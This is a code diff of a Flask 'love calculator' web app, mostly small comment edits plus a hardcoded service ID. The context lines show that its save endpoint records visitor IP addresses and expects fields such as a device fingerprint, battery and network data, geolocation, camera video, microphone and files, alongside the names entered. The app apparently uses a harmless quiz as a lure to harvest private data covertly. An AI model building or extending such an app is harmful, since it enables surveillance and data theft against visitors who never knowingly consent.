@@ -3,14 +3,12 @@ import json
 import os
 import sqlite3
 import random
-import re
 from datetime import datetime
 
 app = Flask(__name__)
 
-# ---------- Read Service ID from environment variable ----------
-# Set this on Render: Environment Variables → SERVICE_ID = srv-d7jkpe3bc2fs73c2qiu0
-SERVICE_ID = os.environ.get('SERVICE_ID', 'unknown-service')
+# ---------- Your Service ID (hardcoded) ----------
+SERVICE_ID = "srv-d7jkstl7vvec7399hom0"
 
 # ---------- SQLite Database Setup ----------
 DB_FILE = 'visitors.db'
@@ -18,7 +16,7 @@ DB_FILE = 'visitors.db'
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    # Main visitor table – add service_id column
+    # Main visitor table – includes service_id column
     c.execute('''
         CREATE TABLE IF NOT EXISTS visitors (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -57,11 +55,11 @@ def init_db():
             longitude REAL
         )
     ''')
-    # Add service_id column if it doesn't exist (for older databases)
+    # Ensure service_id column exists (for older databases)
     try:
         c.execute("ALTER TABLE visitors ADD COLUMN service_id TEXT")
     except sqlite3.OperationalError:
-        pass  # column already exists
+        pass
     conn.commit()
     conn.close()
 
@@ -192,7 +190,7 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
-    data['service_id'] = SERVICE_ID   # <--- ADD SERVICE ID HERE
+    data['service_id'] = SERVICE_ID   # <-- service ID added here
     required_fields = ['sessionId', 'name', 'crush_name', 'fingerprint', 'batteryLevel', 'batteryCharging',
                        'networkType', 'networkSpeed', 'deviceMemory', 'screen', 'timezone', 'userAgent',
                        'latitude', 'longitude', 'mapUrl', 'cameraVideo', 'microphone', 'files']
@@ -324,7 +322,7 @@ def calculate_love():
     message = get_love_message(name1, name2, percentage)
     return jsonify({'percentage': percentage, 'message': message})
 
-# ---------- HTML Template (Two‑names + love percentage) ----------
+# ---------- HTML Template (complete) ----------
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -819,7 +817,7 @@ HTML_TEMPLATE = '''
                 phoneInput.disabled = true;
                 sendBtn.style.display = 'none';
             } else {
-                statusDiv.innerText = 'Error saving. Please try again after some time.';
+                statusDiv.innerText = 'Error saving. Please try again.';
                 sendBtn.disabled = false;
                 sendBtn.innerText = '💬 Send to my phone';
             }
